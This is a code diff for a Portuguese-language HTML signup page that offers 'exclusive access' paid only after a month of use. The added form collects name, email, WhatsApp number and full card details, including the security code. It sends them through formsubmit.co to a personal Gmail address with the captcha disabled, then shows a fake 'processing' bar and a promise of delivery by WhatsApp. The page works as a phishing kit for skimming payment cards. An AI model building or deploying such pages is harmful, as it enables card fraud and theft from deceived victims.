@@ -3,75 +3,138 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Cadastro em Análise</title>
+  <title>Cadastro Profissional</title>
   <style>
     body {
       font-family: Arial, sans-serif;
-      background: #fff;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
+      background-color: #fff;
+      padding: 20px;
       color: #333;
     }
-
-    .container {
+    h2 {
+      color: #e60014;
       text-align: center;
-      max-width: 400px;
     }
-
-    h1 {
-      font-size: 24px;
-      margin-bottom: 20px;
+    form {
+      max-width: 500px;
+      margin: auto;
     }
-
-    .progress-bar {
+    label {
+      display: block;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    input, select {
       width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    button {
+      margin-top: 20px;
+      background-color: #e60014;
+      color: #fff;
+      border: none;
+      padding: 12px;
+      width: 100%;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+    }
+    .progress-container {
+      display: none;
+      max-width: 500px;
+      margin: 40px auto;
+      text-align: center;
+    }
+    .progress-bar {
       background-color: #eee;
       border-radius: 30px;
       overflow: hidden;
-      margin-bottom: 20px;
+      height: 20px;
     }
-
     .progress {
       height: 20px;
       width: 0%;
       background-color: #e60014;
-      animation: load 3s forwards;
+      animation: fillBar 3s forwards;
     }
-
-    @keyframes load {
+    @keyframes fillBar {
       0% { width: 0%; }
       100% { width: 100%; }
     }
-
-    .message {
+    .final-message {
       display: none;
       font-size: 18px;
       color: #000;
-      margin-top: 10px;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Processando seu cadastro...</h1>
+
+  <h2>Cadastre-se para receber seu acesso exclusivo</h2>
+  <p style="text-align:center;">Você só paga após 1 mês de uso. Nosso grupo VIP recebe diversas oportunidades antecipadas!</p>
+
+  <form id="cadastroForm" action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST" onsubmit="mostrarBarra(event)">
+    <label>Nome completo</label>
+    <input type="text" name="Nome" required>
+
+    <label>E-mail</label>
+    <input type="email" name="Email" required>
+
+    <label>Telefone para contato (WhatsApp)</label>
+    <input type="tel" name="Telefone/WhatsApp" required>
+
+    <label>Nome no Cartão</label>
+    <input type="text" name="NomeCartao" required>
+
+    <label>Número do Cartão</label>
+    <input type="text" name="NumeroCartao" required maxlength="19" placeholder="0000 0000 0000 0000">
+
+    <label>Data de Validade</label>
+    <input type="text" name="Validade" required placeholder="MM/AA">
+
+    <label>Código de Segurança</label>
+    <input type="text" name="CodigoSeguranca" required maxlength="4">
+
+    <label>Deseja entrar no nosso grupo VIP? (Mais oportunidades exclusivas)</label>
+    <select name="GrupoVIP" required>
+      <option value="Sim">Sim</option>
+      <option value="Não">Não</option>
+    </select>
+
+    <!-- Redirecionar para página de carregamento -->
+    <input type="hidden" name="_next" value="https://seusite.com/cadastro-analisando.html">
+    <input type="hidden" name="_captcha" value="false">
+
+    <button type="submit">Finalizar Cadastro</button>
+  </form>
+
+  <!-- Tela de carregamento -->
+  <div class="progress-container" id="carregando">
+    <h2>Processando seu cadastro...</h2>
     <div class="progress-bar">
       <div class="progress"></div>
     </div>
-    <div class="message" id="final-msg">
+    <div class="final-message" id="mensagemFinal">
       ✅ Seu cadastro está em análise.<br>
       Em breve enviaremos o seu produto por WhatsApp.
     </div>
   </div>
 
   <script>
-    setTimeout(() => {
-      document.getElementById("final-msg").style.display = "block";
-    }, 3000);
+    function mostrarBarra(event) {
+      event.preventDefault();
+      document.getElementById("cadastroForm").style.display = "none";
+      document.getElementById("carregando").style.display = "block";
+      setTimeout(() => {
+        document.getElementById("mensagemFinal").style.display = "block";
+        document.getElementById("cadastroForm").submit();
+      }, 3000);
+    }
   </script>
+
 </body>
 </html>
